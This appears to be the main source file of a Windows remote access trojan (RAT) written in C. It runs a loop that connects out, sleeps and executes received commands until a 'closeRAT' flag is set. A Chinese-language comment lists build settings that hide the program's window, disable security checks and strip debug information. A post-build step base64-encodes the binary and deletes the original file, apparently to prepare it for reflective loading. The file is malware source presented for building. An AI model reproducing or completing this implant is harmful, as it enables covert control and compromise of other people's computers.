#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <windows.h>
#include "CLite.h"
#include "Command.h"
#include "Sleep.h"
#include "Connect.h"
#include "RefLoader.h"

/*
* ⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️
* 1.Release x64
* 2.常规: 平台工具集(LLVM (clang-cl))
* 3.C/C++
* 优化: 优化(已禁用)
* 代码生成: 启用 C++ 异常(否); 运行库(多线程); 安全检查(禁用安全检查)
* 4.链接器
* 输入: 附加依赖项(ws2_32.lib iphlpapi.lib Crypt32.lib); 忽略所有默认库(是)
* 清单文件: 生成清单(否)
* 调试: 生成调试信息(否)
* 系统: 子系统(窗口)
* 高级: 入口点(main)
* 5.生成事件
* 生成后事件: 命令行(powershell -Command "[Convert]::ToBase64String([IO.File]::ReadAllBytes('$(OutDir)$(TargetFileName)')) | Out-File '$(OutDir)$(TargetName)_Base64.txt' -Encoding UTF8; Remove-Item '$(OutDir)$(TargetFileName)'")
*/

int main() {
	if (InitCLite()) {
		while (1) {
			Connect();
			Silence();
			RunCommands();
			if (closeRAT) {
				break;
			}
#ifdef _DEBUG
			printf("MapObj heap count: %d, StringObj heap count %d, other heap count: %d.\n", mapHeapNum, stringHeapNum, allHeapNum - mapHeapNum - stringHeapNum);
#endif
		}
	}
	return 0;
}